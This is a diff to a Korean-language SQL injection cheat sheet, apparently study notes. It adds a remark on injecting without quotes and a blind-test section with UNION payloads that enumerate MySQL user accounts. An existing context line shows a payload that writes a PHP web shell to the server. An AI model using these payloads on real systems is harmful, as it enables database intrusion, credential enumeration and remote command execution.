@@ -10,6 +10,7 @@ SQL Injection은 애플리케이션의 입력값 검증 취약점을 이용하�
 ```sql
 # 기본 SQL Injection 탐지
 # 작은따옴표(')로 SQL 구문 오류를 유발하여 취약점 존재 여부 확인
+# 검증이 제대로 되지 않아서 `이나 '를 사용하지 않아도 인젝션이 가능한 경우가 있다.
 admin'
 
 # SQL 주석을 이용한 뒤쪽 쿼리 무효화
@@ -124,6 +125,13 @@ secure_file_priv 설정이 허용하는 경우 파일을 서버에 작성할 수
 
 # 주의: 500 에러가 발생해도 파일이 생성되었을 수 있으므로 확인 필요
 ' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+```
+
+### Blind SQL Test
+```sql
+0 UNION select user,2,3 from mysql.user where user like 'a%'-- -
+
+0 UNION select user,2,3 from mysql.user where user like 'r%'-- -
 ```
 
 </details>
